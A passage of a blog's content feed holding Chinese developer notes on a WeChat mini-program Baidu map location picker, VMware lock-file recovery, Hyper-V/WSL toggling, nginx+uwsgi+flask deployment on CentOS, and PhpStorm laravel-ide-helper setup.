&#123;</span><br><span class="line">        &#x2F;&#x2F; console.log(res);</span><br><span class="line">        let sug &#x3D; [];</span><br><span class="line">        let wxMarkerData &#x3D; res.wxMarkerData;</span><br><span class="line">        &#x2F;&#x2F; console.log(wxMarkerData)</span><br><span class="line">        for (let i of wxMarkerData) &#123;</span><br><span class="line">          &#x2F;&#x2F; console.log(i)</span><br><span class="line">          sug.push(&#123; &#x2F;&#x2F; 获取返回结果，放到sug数组中</span><br><span class="line">            title: i.title,</span><br><span class="line">            id: i.id,</span><br><span class="line">            addr: i.address,</span><br><span class="line">            latitude: i.latitude,</span><br><span class="line">            longitude: i.longitude</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (sug.length &gt; 0) &#123;</span><br><span class="line">          that.setData(&#123;</span><br><span class="line">            selectedId: 0,</span><br><span class="line">            centerData: sug[0],</span><br><span class="line">            nearList: sug,</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      fail(err) &#123;</span><br><span class="line">        console.log(err)</span><br><span class="line">        wx.hideLoading(&#123;&#125;);</span><br><span class="line">        wx.showToast(&#123;</span><br><span class="line">          title: &#39;获取附近地址信息失败&#39;,</span><br><span class="line">          icon: &#39;none&#39;,</span><br><span class="line">          duration: 1500</span><br><span class="line">        &#125;)</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">          wx.navigateBack(&#123;</span><br><span class="line">            delta: 1</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;, 1500)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;显示搜索列表</span><br><span class="line">  showAddList: function () &#123;</span><br><span class="line">    this.setData(&#123;</span><br><span class="line">      addListShow: true</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;根据关键词搜索匹配位置</span><br><span class="line">  getsuggest: function (ev) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">      addListShow: true</span><br><span class="line">    &#125;)</span><br><span class="line">    let keyWold &#x3D; ev.detail.value.trim(),</span><br><span class="line">      &#123;</span><br><span class="line">        currentRegion</span><br><span class="line">      &#125; &#x3D; that.data,</span><br><span class="line">      searchCity &#x3D; currentRegion.city;</span><br><span class="line"></span><br><span class="line">    if (keyWold !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">      &#x2F;* 根据输入的关键字,在当前城市搜索关键字地址信息 *&#x2F;</span><br><span class="line">      BMap.suggestion(&#123;</span><br><span class="line">        query: keyWold,</span><br><span class="line">        region: searchCity, &#x2F;&#x2F;市</span><br><span class="line">        city_limit: true,</span><br><span class="line">        &#x2F;&#x2F; 搜索结果处理</span><br><span class="line">        success: res &#x3D;&gt; &#123;</span><br><span class="line">          let newList &#x3D; res.result.filter(item &#x3D;&gt; &#123;</span><br><span class="line">            return item.location;</span><br><span class="line">          &#125;);</span><br><span class="line">          &#x2F;&#x2F; console.log(newList)</span><br><span class="line">          that.setData(&#123;</span><br><span class="line">            nearList: newList,</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        fail(err) &#123;</span><br><span class="line">          console.log(err)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      if (!that.data.addListShow) &#123;</span><br><span class="line">        that.setData(&#123;</span><br><span class="line">          addListShow: true</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;点击选择地图下方列表某项</span><br><span class="line">  chooseCenter: function (e) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let id &#x3D; e.currentTarget.id;</span><br><span class="line">    let nearList &#x3D; that.data.nearList;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">      selectedId: id,</span><br><span class="line">      centerData: nearList[id],</span><br><span class="line">      latitude: nearList[id].latitude,</span><br><span class="line">      longitude: nearList[id].longitude,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;点击选择搜索结果</span><br><span class="line">  backfill: function (e) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let id &#x3D; e.currentTarget.id;</span><br><span class="line">    let nearList &#x3D; that.data.nearList;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">      selectedId: id,</span><br><span class="line">      centerData: nearList[id],</span><br><span class="line">      addListShow: false,</span><br><span class="line">      latitude: nearList[id].latitude,</span><br><span class="line">      longitude: nearList[id].longitude</span><br><span class="line">    &#125;);</span><br><span class="line">    &#x2F;&#x2F; 选择完返回地图页面</span><br><span class="line">    &#x2F;&#x2F; let location &#x3D; nearList[id].latitude + &#39;,&#39; + nearList[id].longitude;</span><br><span class="line">    &#x2F;&#x2F; that.nearby_search(nearList[id].title, location);</span><br><span class="line">    &#x2F;&#x2F; console.log(that.data.centerData)</span><br><span class="line">    &#x2F;&#x2F;选择完返回上一页</span><br><span class="line">    wx.navigateBack(&#123;</span><br><span class="line">      delta: 1</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;返回上一页或关闭搜索页面</span><br><span class="line">  back1: function () &#123;</span><br><span class="line">    wx.navigateBack(&#123;</span><br><span class="line">      delta: 1</span><br><span class="line">    &#125;)</span><br><span class="line">    &#x2F;&#x2F; if (this.data.addListShow) &#123;</span><br><span class="line">    &#x2F;&#x2F;   this.setData(&#123;</span><br><span class="line">    &#x2F;&#x2F;     addListShow: false</span><br><span class="line">    &#x2F;&#x2F;   &#125;)</span><br><span class="line">    &#x2F;&#x2F; &#125;</span><br><span class="line">    &#x2F;&#x2F;返回上一页</span><br><span class="line">    &#x2F;&#x2F; else &#123;</span><br><span class="line">    &#x2F;&#x2F;   wx.navigateBack(&#123;</span><br><span class="line">    &#x2F;&#x2F;     delta: 1</span><br><span class="line">    &#x2F;&#x2F;   &#125;)</span><br><span class="line">    &#x2F;&#x2F; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;确认选择地址</span><br><span class="line">  selectedOk: function () &#123;</span><br><span class="line">    console.log(this.data.centerData)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/yu17310133443/article/details/88991021">微信小程序——打开地图 选择位置 完整功能实现代码(定位，检索周边，可移动选点，可搜索，腾讯地图API)</a></p>
<p><a href="https://github.com/yanmymickey/Baidumap">代码GitHub——微信小程序百度地图API移动选点</a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>wechatweb</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机挂起无法恢复</title>
    <url>/2020/01/16/Note/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%82%E8%B5%B7%E6%97%A0%E6%B3%95%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="虚拟机挂起无法恢复"><a href="#虚拟机挂起无法恢复" class="headerlink" title="虚拟机挂起无法恢复"></a>虚拟机挂起无法恢复</h1><h2 id="挂起"><a href="#挂起" class="headerlink" title="挂起"></a>挂起</h2><p>vmware 支持几种工作状态:关机，挂起，重新启动</p>
<p><strong>挂起</strong>：下次打开虚拟机会还原到挂起时虚拟机的状态</p>
<a id="more"></a>

<h2 id="如何做到？"><a href="#如何做到？" class="headerlink" title="如何做到？"></a>如何做到？</h2><p>为了保存挂起时虚拟机状态，会在虚拟机文件夹创建一个vmess后缀的文件， 这个文件记录了虚拟机挂起状态</p>
<h2 id="关于强制关闭vmware"><a href="#关于强制关闭vmware" class="headerlink" title="关于强制关闭vmware"></a>关于强制关闭vmware</h2><p>由于卡住或其他异常原因强制关闭vmware，再次开启会显示被锁住无法打开</p>
<p><strong>原因：</strong>因为一个虚拟机打开，避免重复开启同一虚拟机，会创建几个lck文件夹将这个虚拟机锁住，而强制退出会导致虚拟机来不及删除这几个文件夹，下次再打开，导致读取到lck文件夹，被锁住无法打开。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>删除vmess文件和所有lck文件夹</p>
<p><strong>结果：</strong>会丢失保存的虚拟机状态，虚拟机重新开机</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>如果出现程序占用无法删除的情况，可以找到占用程序关闭后再删除</li>
<li>这样会导致再次打开虚拟机出现正在等待连接，因为占用程序被关闭了</li>
<li>重启或者找到占用程序再次开启就好了</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql数据库</title>
    <url>/2019/05/20/Note/%E8%A7%A3%E5%86%B3%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Ehyper-v%E5%86%B2%E7%AA%81/</url>
    <content><![CDATA[<h1 id="虚拟机与hyper-v冲突"><a href="#虚拟机与hyper-v冲突" class="headerlink" title="虚拟机与hyper-v冲突"></a>虚拟机与hyper-v冲突</h1><ul>
<li>通过命令关闭Hyper-V（控制面板关闭Hyper-V起不到决定性作用，要彻底关闭Hyper-V）</li>
<li>以管理员身份运行Windows Powershell (管理员)（Windows键+X）</li>
<li>运行下面命令并重启电脑：</li>
</ul>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#关闭hype-V</span><br><span class="line">bcdedit &#x2F;set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<ul>
<li>想要使用wsl时,下面是相关命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#启用hype-V</span><br><span class="line">bcdedit &#x2F;set hypervisorlaunchtype auto start</span><br><span class="line"></span><br><span class="line">#转换ubuntu的wsl版本</span><br><span class="line">wsl --set-version Ubuntu 2</span><br><span class="line"></span><br><span class="line">#查询已经安装的wsl版本</span><br><span class="line">wsl -l -V</span><br><span class="line">#或者</span><br><span class="line">wsl --list --version</span><br><span class="line"></span><br><span class="line">#设置wsl默认启动版本</span><br><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>部署nginx+uwsgi+flask</title>
    <url>/2020/08/06/Note/%E9%83%A8%E7%BD%B2nginx+uwsgi+flask/</url>
    <content><![CDATA[<h1 id="部署nginx-uwsgi-flask"><a href="#部署nginx-uwsgi-flask" class="headerlink" title="部署nginx+uwsgi+flask"></a>部署nginx+uwsgi+flask</h1><h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><p>Centos7.6</p>
<p>python3.7</p>
<p>nginx 1.12</p>
<a id="more"></a>

<h2 id="项目文件"><a href="#项目文件" class="headerlink" title="项目文件"></a>项目文件</h2><p>项目文件最好放在一个权限较低的目录，当然，配置好权限也是可以的</p>
<p>将flask项目通过ftp或者git上传到/home/project</p>
<h2 id="uwsgi"><a href="#uwsgi" class="headerlink" title="uwsgi"></a>uwsgi</h2><h3 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h3><p>什么是虚拟环境?</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1019273143120480">virtualenv - 廖雪峰</a></p>
<p>简而言之就是将当前项目需要用到的一些第三方库分开存储，不直接放置到系统目录，这样可以保证环境的独立性和稳定性，系统目录中的库升级不会影响到项目。</p>
<h4 id="新建虚拟环境"><a href="#新建虚拟环境" class="headerlink" title="新建虚拟环境"></a>新建虚拟环境</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装</span><br><span class="line">pip3 install virtualenv</span><br><span class="line"># 进入项目目录</span><br><span class="line">cd &#x2F;home&#x2F;project</span><br><span class="line"># 更改目录所有者</span><br><span class="line">sudo chown -R yourUserName:yourUserName 项目路径&#x2F;</span><br><span class="line">cd 项目路径&#x2F;</span><br><span class="line"># 新建虚拟环境，保存当前项目所需依赖 </span><br><span class="line">sudo virtualenv venv</span><br></pre></td></tr></table></figure>
<h4 id="进入虚拟环境"><a href="#进入虚拟环境" class="headerlink" title="进入虚拟环境"></a>进入虚拟环境</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source venv&#x2F;bin&#x2F;activate</span><br></pre></td></tr></table></figure>
<h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 虚拟环境中就不要用sudo了，不然又是调用系统目录的pip了</span><br><span class="line"># 在虚拟环境中安装项目所需依赖</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"># 在虚拟环境中安装 uwsgi 和 uwsgi的状态监控器</span><br><span class="line">pip install uwsgi uwsgitop</span><br></pre></td></tr></table></figure>
<h3 id="编写uwsgi配置文件"><a href="#编写uwsgi配置文件" class="headerlink" title="编写uwsgi配置文件"></a>编写uwsgi配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line"># python 启动程序文件 app.run所在的文件名</span><br><span class="line">wsgi-file &#x3D; </span><br><span class="line"></span><br><span class="line"># python 程序内用以启动的变量名 app</span><br><span class="line">callable &#x3D; app</span><br><span class="line"></span><br><span class="line"># 进程数</span><br><span class="line">processes &#x3D; 5</span><br><span class="line"></span><br><span class="line"># 线程数</span><br><span class="line">threads &#x3D; 2</span><br><span class="line"></span><br><span class="line">#主进程</span><br><span class="line">master&#x3D;true</span><br><span class="line"></span><br><span class="line"># 指向网站目录</span><br><span class="line">chdir&#x3D;&#x2F;home&#x2F;project&#x2F;项目路径&#x2F;</span><br><span class="line"></span><br><span class="line"># socket文件，配置nginx时候使用 </span><br><span class="line"># 也可以写出ip:port端口模式</span><br><span class="line"># 比如 127.0.0.1:5001</span><br><span class="line"># 端口模式的话nginx也要一个端口,就挺啰嗦的</span><br><span class="line">socket&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.sock            </span><br><span class="line">chmod-socket&#x3D;666</span><br><span class="line">#http模式,不需要配合nginx即可单独使用</span><br><span class="line">#但是nginx是c编写的,解析http请求的效率要高很多</span><br><span class="line">#建议使用socket加nginx的模式</span><br><span class="line">#http&#x3D;0.0.0.0:5001</span><br><span class="line"></span><br><span class="line"># status文件，可以查看uwsgi的运行状态</span><br><span class="line">stats&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.status            </span><br><span class="line"># pid文件，通过该文件可以控制uwsgi的重启和停止 </span><br><span class="line">pidfile&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.pid            </span><br><span class="line"># 日志文件，通过该文件查看uwsgi后台运行的日志</span><br><span class="line">daemonize&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.log   </span><br><span class="line">logfile-chmod&#x3D;644</span><br><span class="line"></span><br><span class="line"># uid&#x3D;</span><br><span class="line"># gid&#x3D;</span><br><span class="line"># uwsgi的进程名称前缀</span><br><span class="line"># procname-prefix-spaced&#x3D;mysite                </span><br><span class="line"></span><br><span class="line"># py文件修改自动加载,生成环境不建议开启</span><br><span class="line">#py-autoreload&#x3D;true </span><br><span class="line"></span><br><span class="line">buffer-size &#x3D; 32768</span><br></pre></td></tr></table></figure>
<h3 id="启停uwsgi"><a href="#启停uwsgi" class="headerlink" title="启停uwsgi"></a>启停uwsgi</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 虚拟环境运行</span><br><span class="line"># 启动</span><br><span class="line">uwsgi --ini uwsgi.ini             </span><br><span class="line"># 重启</span><br><span class="line">uwsgi --reload uwsgi.pid          </span><br><span class="line"># 关闭</span><br><span class="line">uwsgi --stop uwsgi.pid</span><br></pre></td></tr></table></figure>
<h3 id="服务监控"><a href="#服务监控" class="headerlink" title="服务监控"></a>服务监控</h3><ul>
<li>读取uwsgi实时状态,json字符串形式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 虚拟环境运行</span><br><span class="line">uwsgi --connect-and-read uwsgi&#x2F;uwsgi.status</span><br></pre></td></tr></table></figure>
<ul>
<li>uwsgitop</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 虚拟环境运行</span><br><span class="line">uwsgitop uwsgi&#x2F;uwsgi.status</span><br></pre></td></tr></table></figure>
<h3 id="退出虚拟环境"><a href="#退出虚拟环境" class="headerlink" title="退出虚拟环境"></a>退出虚拟环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>编译安装或者用包管理安装都是可以的，满足项目需求就可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure>
<p>配置文件目录：<code>/etc/nginx</code></p>
<p>配置文件: <code>/etc/nginx/nginx.conf</code></p>
<p>站点文件源文件：<code>/etc/nginx/sites-available</code></p>
<p>站点文件激活文件夹：<code>/etc/nginx/sites-enabled</code></p>
<p><strong>说明：</strong></p>
<ul>
<li>centos yum安装的nginx是没用下面俩个站点目录的，手动创建，然后在<code>nginx.conf</code>中include<code>/etc/nginx/sites-enabled/*</code></li>
<li>将站点文件源文件写在<code>sites-available</code>目录，添加软链接到<code>sites-enabled</code>，如若要关闭站点，只需要将 <code>sites-enabled</code>目录下的软链接删除即可</li>
</ul>
<p>日志目录：<code>/var/log/nginx/</code></p>
<h3 id="配置站点"><a href="#配置站点" class="headerlink" title="配置站点"></a>配置站点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;</span><br><span class="line">sudo vim 项目名称.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	# 有域名就配置server_name为域名,端口监听80</span><br><span class="line">    # 监听端口</span><br><span class="line">    listen 5001;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    </span><br><span class="line">    access_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_access.log;</span><br><span class="line">    error_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_error.log</span><br><span class="line">    </span><br><span class="line">    index index.html; </span><br><span class="line">    #动态请求</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">         include uwsgi_params;</span><br><span class="line">	 uwsgi_pass unix:&#x2F;&#x2F;&#x2F;home&#x2F;project&#x2F;项目名称&#x2F;uwsgi&#x2F;uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#创建软链接</span><br><span class="line">sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;项目名称.conf &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;项目名称.conf</span><br><span class="line"></span><br><span class="line">#检验配置文件</span><br><span class="line">sudo nginx -t</span><br><span class="line">sudo systemctl restart nginx.service</span><br></pre></td></tr></table></figure>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>访问站点是否可以访问</p>
<h3 id="排查问题参考"><a href="#排查问题参考" class="headerlink" title="排查问题参考"></a>排查问题参考</h3><ul>
<li>云服务器确认端口是否开启可访问</li>
<li>服务器本地是否可访问<ul>
<li><code>curl http://127.0.0.1:port</code></li>
<li>有响应检查服务器端口，无响应检查nginx</li>
</ul>
</li>
<li>ip：port是否可访问<ul>
<li>有响应，但是只是出现nginx，检查uwsgi</li>
<li>无响应，检查服务器端口，然后再检查nginx</li>
</ul>
</li>
<li>注意权限问题引发的日志或者程序拒绝服务500等错误码</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>python</tag>
        <tag>flask</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>配置phpstorm支持laravel代码提示</title>
    <url>/2020/01/12/Note/%E9%85%8D%E7%BD%AEphpstorm%E6%94%AF%E6%8C%81laravel%E4%BB%A3%E7%A0%81%E6%8F%90%E7%A4%BA/</url>
    <content><![CDATA[<h1 id="配置phpstorm支持laravel代码提示"><a href="#配置phpstorm支持laravel代码提示" class="headerlink" title="配置phpstorm支持laravel代码提示"></a>配置phpstorm支持laravel代码提示</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安装和使用laravel-ide-helper和phpstorm中的laravel插件</p>
<a id="more"></a>
<h2 id="laravel插件"><a href="#laravel插件" class="headerlink" title="laravel插件"></a>laravel插件</h2><ol>
<li>在file-&gt;settings-&gt;plugins中搜索laravel并安装</li>
<li>在file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravel中启用,勾选enabled选择框</li>
<li>两种情况配置views等提示<ul>
<li>若laravel为phpstorm打开的项目目录,则默认配置即可用</li>
<li>若laravel为phpstorm打开的项目目录的子目录,则需要配置<ul>
<li>file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravel-&gt;views/templates</li>
<li>仿照默认的配置,从根目录开始书写路径<ul>
<li>例如D:\phpstudy_pro\WWW\blog\app\views</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="laravel-ide-helper"><a href="#laravel-ide-helper" class="headerlink" title="laravel-ide-helper"></a>laravel-ide-helper</h2><p>需要借助composer</p>
<h3 id="composer-安装-laravel-ide-helper"><a href="#composer-安装-laravel-ide-helper" class="headerlink" title="composer 安装 laravel-ide-helper"></a>composer 安装 laravel-ide-helper</h3><ul>
<li><code>composer require --dev barryvdh/laravel-ide-helper</code></li>
</ul>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>在 <code>「config/app.php」</code>的 <code>「providers」</code>数组中加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Laravel 版本小于 5.5 的话，需要注册提供者，5.5之后的版本laravel加入了自动注册</p>
</blockquote>
<p>**注:**如果只在开发环境中安装「larave-ide-helper」，可以在<code>「app/Providers/AppServiceProvider.php」</code>的<code>「register」</code>方法中写入下面代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function register()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;app-&gt;environment() !&#x3D;&#x3D; &#39;production&#39;) &#123;</span><br><span class="line">        $this-&gt;app-&gt;register(\Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导出配置文件"><a href="#导出配置文件" class="headerlink" title="导出配置文件"></a>导出配置文件</h3><p>（如果默认配置就满足需求了，也可以忽略这一步）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan vendor:publish --provider&#x3D;&quot;Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider&quot; --tag&#x3D;config</span><br></pre></td></tr></table></figure>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan ide-helper:generate - 为 Facades 生成注释</span><br><span class="line">php artisan ide-helper:models - 为数据模型生成注释</span><br><span class="line">php artisan ide-helper:meta - 生成 PhpStorm Meta file</span><br></pre></td></tr></table></figure>
<h4 id="自动为Facades-生成注释"><a href="#自动为Facades-生成注释" class="headerlink" title="自动为Facades 生成注释"></a>自动为Facades 生成注释</h4><p>终端输入以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan ide-helper:generate</span><br></pre></td></tr></table></figure>
<p><strong>注:</strong> 如果存在文件 「bootstrap/compiled.php」 需要先删除， 可以在生成文当前运行 php artisan clear-compiled。</p>
<h4 id="自动为模型生成注释"><a href="#自动为模型生成注释" class="headerlink" title="自动为模型生成注释"></a>自动为模型生成注释</h4><p>为所有模型生成注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan ide-helper:models</span><br><span class="line">#这时会出现询问：</span><br><span class="line">Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes&#x2F;No):  (yes&#x2F;no) [no]:</span><br></pre></td></tr></table></figure>
<p>**注:**输入 yes 则会直接在模型文件中写入注释，否则会生成「_ide_helper_models.php」文件。建议选择 yes，这样在跟踪文件的时候不会跳转到「_ide_helper_models.php」文件，不过这么做最好对模型文件做个备份，至少在生成注释之前用 git 控制一下版本，以防万一。</p>
<blockquote>
<p><strong>提示：</strong> 为模型生成字段信息必须在数据库中存在相应的数据表，不要生成 migration 还没运行 migrate 的时候就生成注释，这样是得不到字段信息的。</p>
</blockquote>
<h4 id="自动为链式操作注释"><a href="#自动为链式操作注释" class="headerlink" title="自动为链式操作注释"></a>自动为链式操作注释</h4><p>这是什么意思呢？举个例子，在 migration 文件中经常可以看见这样的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$table-&gt;string(&#39;email&#39;)-&gt;unique();</span><br></pre></td></tr></table></figure>
<p>这时就算调用过了 <code>php artisan ide-helper:generate</code>，在调用像 <code>-&gt;unique()</code> 这样的链式操作的时候也无法实现代码提示.</p>
<p>需要将配置文件(<code>ide-help.php</code>,可以使用phpstorm的Find-&gt;Find in path 查找 include_fluent)<code>&#39;include_fluent&#39; =&gt; false</code> 修改为 <code>&#39;include_fluent&#39; =&gt; true</code>，</p>
<p>重新运行 <code>php artisan ide-helper:generate</code>。</p>
<h4 id="生成-phpStorm-meta-php"><a href="#生成-phpStorm-meta-php" class="headerlink" title="生成 .phpStorm.meta.php"></a>生成 .phpStorm.meta.php</h4><p>可以生成一个<code>.phpStorm.meta.php</code>文件去支持工厂模式.</p>
<p>对于 Laravel, 这意味着我们可以让 PhpStorm 理解我们从 IoC 容器中解决了什么类型的对象。例如：事件将返回一个<code>「Illuminate\Events\Dispatcher」</code>对象，利用 meta 文件您可以调用 <code>app(&#39;events&#39;)</code> 并且它将自动完成 Dispatcher 的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app(&#39;events&#39;)-&gt;fire();</span><br><span class="line">\App::make(&#39;events&#39;)-&gt;fire();</span><br><span class="line"></span><br><span class="line">&#x2F;** @var \Illuminate\Foundation\Application $app *&#x2F;</span><br><span class="line">$app-&gt;make(&#39;events&#39;)-&gt;fire();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; When the key is not found, it uses the argument as class name</span><br><span class="line">app(&#39;App\SomeClass&#39;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**提示:**可能需要重启 Phpstorm 使 .phpStorm.meta.php 文件生效。</p>
</blockquote>
<h4 id="自动运行-generate"><a href="#自动运行-generate" class="headerlink" title="自动运行 generate"></a>自动运行 generate</h4><p>想在依赖包更新是自动更新注释，可以在 composer.json 文件中做如下配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;scripts&quot;:&#123;</span><br><span class="line">    &quot;post-update-cmd&quot;: [</span><br><span class="line">        &quot;Illuminate\\Foundation\\ComposerScripts::postUpdate&quot;,</span><br><span class="line">        &quot;php artisan ide-helper:generate&quot;,</span><br><span class="line">        &quot;php artisan ide-helper:meta&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="代码提示"><a href="#代码提示" class="headerlink" title="代码提示"></a>代码提示</h4><p>当想提示views文件,models文件时可以使用默认快捷键<code>ctrl+space</code></p>
<p>**注:**但可能会被切换输入法等占用,所以可以更改输入法快捷键或者phpstorm中的快捷键</p>
<h5 id="修改phpstorm中的快捷键方法"><a href="#修改phpstorm中的快捷键方法" class="headerlink" title="修改phpstorm中的快捷键方法"></a>修改phpstorm中的快捷键方法</h5><p>在file-&gt;settings-&gt;keymap中搜索completion,修改冲突快捷键</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>php</tag>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>配置本地站点方法</title>
    <url>/2020/11/05/Note/%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E7%AB%99%E7%82%B9%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="配置本地站点方法"><a href="#配置本地站点方法" class="headerlink" title="配置本地站点方法"></a>配置本地站点方法</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>修改nginx配置文件,可以选择多端口多站点,或者80端口多站点,一般只需修改<code>server_name</code>和<code>root</code></p>
<a id="more"></a>

<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>同步hosts,在hosts文件里面添加本地站点</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>plsql包</title>
